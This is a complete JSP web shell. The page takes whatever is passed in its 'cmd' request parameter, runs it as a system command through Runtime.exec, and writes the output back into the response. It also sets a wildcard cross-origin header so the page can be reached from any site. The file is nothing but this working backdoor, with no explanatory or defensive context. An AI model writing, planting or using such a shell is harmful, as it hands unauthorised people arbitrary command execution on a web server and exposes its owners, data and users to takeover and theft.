<%@page import="java.io.OutputStream"%>
<%@page import="java.io.InputStream"%>
<%@page import="java.io.DataInputStream"%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<% 
    response.addHeader("Access-Control-Allow-Origin", "*"); 
    if (request.getParameter("cmd") != null) { 
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); 
        OutputStream os = p.getOutputStream(); 
        InputStream in = p.getInputStream(); 
        DataInputStream dis = new DataInputStream(in); 
        String disr = dis.readLine(); 
        while ( disr != null ) { 
            out.println(disr);
            disr = dis.readLine(); 
        } 
    } 
%> 

